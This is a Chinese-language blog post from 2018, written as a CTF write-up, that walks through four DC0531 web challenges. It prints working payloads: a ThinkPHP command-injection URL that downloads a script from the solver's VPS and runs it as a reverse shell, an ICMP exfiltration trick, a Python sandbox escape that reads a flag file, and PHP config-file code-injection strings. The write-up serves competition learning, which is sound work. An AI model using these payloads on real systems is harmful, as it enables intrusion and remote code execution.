@@ -1,0 +1,119 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="DC0531线上CTF题解"><meta name="keywords" content="CTF"><meta name="author" content="Mochazz"><meta name="copyright" content="Mochazz"><title>DC0531线上CTF题解 | Mochazz's blog</title><link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  }
+} </script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web1"><span class="toc-number">2.</span> <span class="toc-text">Web1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#方法一"><span class="toc-number">2.1.</span> <span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#方法二"><span class="toc-number">2.2.</span> <span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web2"><span class="toc-number">3.</span> <span class="toc-text">Web2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web3"><span class="toc-number">4.</span> <span class="toc-text">Web3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web4"><span class="toc-number">5.</span> <span class="toc-text">Web4</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#方法一-利用换行符来绕过正则匹配的问题"><span class="toc-number">5.1.</span> <span class="toc-text">方法一,利用换行符来绕过正则匹配的问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#方法二-利用-preg-replace函数的问题"><span class="toc-number">5.2.</span> <span class="toc-text">方法二,利用 preg_replace函数的问题:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用-preg-replace-函数的第二个参数的问题"><span class="toc-number">5.3.</span> <span class="toc-text">利用 preg_replace() 函数的第二个参数的问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#相关文章"><span class="toc-number">6.</span> <span class="toc-text">相关文章</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Mochazz</div><div class="author-info__description text-center">与其哀叹，不如埋头苦干</div><div class="follow-button"><a href="https://github.com/Mochazz">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">149</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">46</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">20</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="http://www.lmxspace.com">l1nk3r</a><a class="author-info-links__name text-center" href="https://www.virzz.com">Virink</a><a class="author-info-links__name text-center" href="http://www.lsafe.org">离心</a><a class="author-info-links__name text-center" href="https://www.kingkk.com">kingkk</a><a class="author-info-links__name text-center" href="https://hpdoger.cn">hpdoger</a><a class="author-info-links__name text-center" href="https://www.smi1e.top">smi1e</a><a class="author-info-links__name text-center" href="http://m4p1e.com">maple</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/backgroud.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Mochazz's blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/about">About</a></span></div><div id="post-info"><div id="post-title">DC0531线上CTF题解</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-06-19</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF竞赛训练/">CTF竞赛训练</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>17:30到火种平台注册了下，吃个饭回来发现比赛结束了。不过还好比赛环境还没关，抓紧时间把题目做一遍。做着做着，Web2题目环境又关闭了，只能本地复现了。自己对Thinkphp的结构还是不熟悉，有时间要去学学了，以下是DC0531 CTF所有题目的WriteUp。（PS：其实就4道题目）<a id="more"></a></p>
+<h3 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h3><p>关注DC0531公众号。一开始以为是签到题，然而并不是。于是就按照 battle ground的规则开始玩。这里有两种解题方法，一种是抓取流量包，一种是命令执行。</p>
+<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p><img src="/img/DC0531/5.jpg" alt="5"></p>
+<p>先看一下有那些武器，然后选择一个捡起，载入武器，然后向你的VPS射击，就可以获取到题目的IP。在射击之前，用<code>tcpdump -nn -i eth0 icmp -w dc0531.cap</code> 先在你的VPS上抓包。</p>
+<p><img src="/img/DC0531/6.png" alt="6"></p>
+<p>这题存在git泄露，先把源代码扒下来</p>
+<p><img src="/img/DC0531/7.png" alt="7"></p>
+<p>这里只解释代码的关键部分，关键代码路径在： <strong>Application/Home/Controller/TestController.class.php</strong> 。</p>
+<p>先看P方法，改方法主要是用于将 <code>$weapon</code> 文件的内容base64加密后前100个字符存放在 <code>$this-&gt;info[&#39;bullet&#39;]</code> 中，用在下面的s方法，代码如下：</p>
+<p><img src="/img/DC0531/8.png" alt="8"></p>
+<p>然后就是r方法，该方法用于初始化 <code>$this-&gt;info[&#39;status&#39;] = 100;</code> ，然后才能利用s方法。s方法就是携带上面base64加密后的 <code>$weapon</code> 文件的内容前100个字符，去ping目标主机，也就是微信公众号中的shot功能，ping命令的-p 选项可以设置icmp报文数据部分的内容。这里要注意下面代码中16、17行， <code>$this-&gt;info[&#39;status&#39;] - 1</code> 为99，相应 <code>$bullet = $this-&gt;info[&#39;bullet&#39;][100-99];</code> 即从<code>$this-&gt;info[&#39;bullet&#39;][1]</code> 开始，漏掉了 <code>$this-&gt;info[&#39;bullet&#39;][0]</code> 所以我们最后获取的内容在开头要加上一个字符。</p>
+<p><img src="/img/DC0531/9.png" alt="9"></p>
+<p>明白了这三个方法，就知道如何利用了。我们先把flag文件装入 <code>$weapon</code> ，然后一直shot我们的VPS，具体利用如下：</p>
+<p><img src="/img/DC0531/10.png" alt="10"></p>
+<p>VPS上用tcpdump抓包，提取内容为：D9waHAKJGZsYWcgPSAiREMwNTMxe1dlY2hBdF9Jc19Tb19DMG9sfSI7Cg== ，在开头随便加上一个字母，这里我加P，解出来如下：</p>
+<p><img src="/img/DC0531/11.png" alt="11"></p>
+<p><img src="/img/DC0531/12.png" alt="12"></p>
+<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>下面说另外一个解法，就是通过命令执行的方式获得flag。其实一开始我发现方法u中存在命令执行，但是看了前面的代码，发现没用调用到，然后就没管了。后来 <strong>Wfox</strong> 师傅提醒我这个是Thinkphp，真是一语惊醒梦中人，Thinkphp是可以通过路由方式调用方法的，方法u的代码如下：</p>
+<p><img src="/img/DC0531/13.png" alt="13"></p>
+<p>下面就说说如何利用，在我们的VPS上留下python反弹shell脚本，然后根据Thinkphp3.2.3的路由规则，分别访问一下两个链接，当然你要在你的VPS上提前侦听某个端口，链接如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://139.198.3.171/index.php/Home/Test/u?PicUrl=http://你的VPSIP/dc0531.py -O /tmp/dc0531.py;<span class="comment">#</span></span><br><span class="line">http://139.198.3.171/index.php/Home/Test/u?PicUrl=;python /tmp/dc0531.py;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/DC0531/14.png" alt="14"></p>
+<p>如果还是不清楚如何回弹shell，你可以参考文章：<a href="https://www.anquanke.com/post/id/147989" target="_blank" rel="noopener">ISCC2018线上赛之Web搅屎</a></p>
+<h3 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h3><p>题目地址：<a href="http://150.95.146.178/" target="_blank" rel="noopener">http://150.95.146.178/</a></p>
+<p>这题环境突然关了，只能本地搭环境复现，题目使用的是Metinfo6.0.0，上网搜索该版本cms漏洞，可以看到 <a href="http://badcode.cc/2018/05/26/Metinfo-6-0-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">Metinfo 6.0.0 任意文件读取漏洞</a> ，题目刚好也是考察这个漏洞，只是题目环境用的是最新版的Metinfo6.0.0，与该博客上的版本代码略有差别，不过还是能绕过，具体分析可以看那篇文章，这里不赘述，直接给出利用方式。</p>
+<p><img src="/img/DC0531/4.png" alt="4"></p>
+<h3 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h3><p>题目地址：nc 139.198.191.81 9999</p>
+<p>python沙箱逃逸，遇到空格和某些关键字就会直接断开，直接read也会断开。payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[i.read()<span class="keyword">for</span>(i)<span class="keyword">in</span>[<span class="number">0x1</span>.__class__.__base__.__subclasses__()[<span class="number">40</span>](<span class="string">"/home/ctf/flag"</span>)]]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/DC0531/3.png" alt="3"></p>
+<h3 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h3><p>题目地址：<a href="http://139.198.191.81:18080/" target="_blank" rel="noopener">http://139.198.191.81:18080/</a></p>
+<p>用dirb扫描发现存在git泄露，用 <a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">Githack</a> 将泄露的文件扒下来，flag.php中即可找到flag。</p>
+<p><img src="/img/DC0531/1.png" alt="1"></p>
+<p><img src="/img/DC0531/2.png" alt="2"></p>
+<p>估计出题人环境没弄好，实际考察内容可参考 <a href="https://github.com/wonderkun/CTF_web/tree/dcf36cb9ba9a580a4e8d92b43480b6575fed2c3a/web200-7" target="_blank" rel="noopener">CTF_web/web200-7</a> ，下面我就直接 <strong>转载过来</strong> 了  懒：）</p>
+<p>phithon师父在小蜜圈里放了一个经典的配置文件写入问题漏洞.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'option'</span>])) <span class="keyword">die</span>();</span><br><span class="line">    $str = addslashes($_GET[<span class="string">'option'</span>]);</span><br><span class="line">    $file = file_get_contents(<span class="string">'./config.php'</span>);</span><br><span class="line">    $file = preg_replace(<span class="string">'|\$option=\'.*\';|'</span>, <span class="string">"\$option='$str';"</span>, $file);</span><br><span class="line">    file_put_contents(<span class="string">'./config.php'</span>, $file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>config.php 的内容如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $option=<span class="string">'test'</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>要求是要getshell,这个场景十分经典，常用在修改配置文件写入的时候。 此处不存在之前说的那个配置文件中用的是”双引号”引起任意代码执行的问题,这这里面用的是单引号,而且 addslashes()处理过了,看似很安全,但是对于脑子里有个黑洞的搞安全的人来讲,这个还真是有问题的.</p>
+<h4 id="方法一-利用换行符来绕过正则匹配的问题"><a href="#方法一-利用换行符来绕过正则匹配的问题" class="headerlink" title="方法一,利用换行符来绕过正则匹配的问题"></a>方法一,利用换行符来绕过正则匹配的问题</h4><p>可以看到正则匹配的是以下内容:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$option=<span class="string">'任意内容'</span></span><br></pre></td></tr></table></figure>
+
+<p>任意内容里面是可以包含转移符 \ 的,所以我们利用下面的方法:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?option=a<span class="string">';%0aphpinfo();//</span></span><br><span class="line"><span class="string">http://127.0.0.1/index.php?option=a</span></span><br></pre></td></tr></table></figure>
+
+<p>执行完第一个之后,config.php中的内容为:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $option=<span class="string">'a\';</span></span><br><span class="line"><span class="string">    phpinfo();//'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是这样并没有办法执行phpinfo(),因为我们插入的 单引号 被转移掉了,所以phpinfo()还是在单引号的包裹之内. 我们在访问下面这个</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?option=a</span><br></pre></td></tr></table></figure>
+
+<p>因为正则 .* 会匹配行内的任意字符无数次.所以 \ 也被认为是其中的一部分,也会被替换掉,执行完之后,config.php中的内容为:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $option=<span class="string">'a'</span>;</span><br><span class="line">    phpinfo();<span class="comment">//';</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>转义符就被替换掉了,就成功的getshell.</p>
+<h4 id="方法二-利用-preg-replace函数的问题"><a href="#方法二-利用-preg-replace函数的问题" class="headerlink" title="方法二,利用 preg_replace函数的问题:"></a>方法二,利用 preg_replace函数的问题:</h4><p>preg_replace函数在处理字符串的时候,会自动对第二个参数的 \ 这个字符进行反转移. 具体为啥要这样干,我也不太懂. 也就是说如果字符串是 “&#39;“,经过 preg_replace()的处理,就变为 “&#39;“,单引号就逃出来了. 所以payload如下:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?option=a\<span class="string">';phpinfo();//</span></span><br></pre></td></tr></table></figure>
+
+<p>config.php变为:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $option=<span class="string">'a\\'</span>;phpinfo();<span class="comment">//'; <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>道理就是 a’;phpinfo();// 经过 addslashes()处理之后,变为a&#39;;phpinfo();// 然后两个反斜杠被preg_replace变成了一个,导致单引号逃脱.</p>
+<h4 id="利用-preg-replace-函数的第二个参数的问题"><a href="#利用-preg-replace-函数的第二个参数的问题" class="headerlink" title="利用 preg_replace() 函数的第二个参数的问题"></a>利用 preg_replace() 函数的第二个参数的问题</h4><p>先看官方对preg_replace()函数的描述<a href="http://php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener">manual</a> 函数原型:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed <span class="variable">$pattern</span> , mixed <span class="variable">$replacement</span> , mixed <span class="variable">$subject</span> [, int <span class="variable">$limit</span> = -1 [, int &amp;<span class="variable">$count</span> ]] )</span><br></pre></td></tr></table></figure>
+
+<p>对replacement的描述.</p>
+<blockquote>
+<p>replacement中可以包含后向引用\n 或(php 4.0.4以上可用)$n，语法上首选后者。 每个 这样的引用将被匹配到的第n个捕获子组捕获到的文本替换。 n 可以是0-99，\0和$0代表完整的模式匹配文本。</p>
+</blockquote>
+<p>所以我们可以用:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/<span class="built_in">test</span>/ph.php?option=;phpinfo();</span><br><span class="line">http://127.0.0.1/<span class="built_in">test</span>/ph.php?option=%00 或者 http://127.0.0.1/<span class="built_in">test</span>/ph.php?option=<span class="variable">$0</span></span><br></pre></td></tr></table></figure>
+
+<p>执行第一条后config.php的内容为:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $option=<span class="string">';phpinfo();'</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>再执行第二条后config.php的内容为:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $option=<span class="string">'$option='</span>;phpinfo();<span class="string">';'</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>刚好闭合掉了前后的两个单引号中间的逃脱出来了.想出这个办法的人,思路真是可以的.</p>
+<h3 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h3><p><a href="http://badcode.cc/2018/05/26/Metinfo-6-0-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">Metinfo 6.0.0 任意文件读取漏洞</a></p>
+<p><a href="http://sec2hack.com/ctf/dc0531-ctf-writeup.html" target="_blank" rel="noopener">DC0531 CTF Writeup</a></p>
+<p><a href="https://github.com/wonderkun/CTF_web/tree/dcf36cb9ba9a580a4e8d92b43480b6575fed2c3a" target="_blank" rel="noopener">CTF_web/web200-7/</a></p>
+<p><a href="http://document.thinkphp.cn/manual_3_2.html" target="_blank" rel="noopener">ThinkPHP3.2完全开发手册</a></p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Mochazz</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://mochazz.github.io/2018/06/19/DC0531线上CTF题解/">https://mochazz.github.io/2018/06/19/DC0531线上CTF题解/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://mochazz.github.io">Mochazz's blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2018/06/29/代码审计Day1 - in_array函数缺陷/"><i class="fa fa-chevron-left">  </i><span>代码审计Day1 - in_array函数缺陷</span></a></div><div class="next-post pull-right"><a href="/2018/06/13/ISCC2018线上赛之Web搅屎/"><span>ISCC2018线上赛之Web搅屎</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'cFxDjSziPHq4xGCbSpRGkND7-gzGzoHsz',
+  appKey:'YhJIRxQHzY9Aix5pSGnYxKkv',
+  placeholder:'ヾﾉ≧∀≦)o留下评论再走吧',
+  avatar:'wavatar',
+  guest_info:guest_info,
+  pageSize:'10',
+  lang: 'zh-cn'
+})</script></div></div><footer class="footer-bg" style="background-image: url(/img/backgroud.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2019 By Mochazz</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+}</script></body></html>
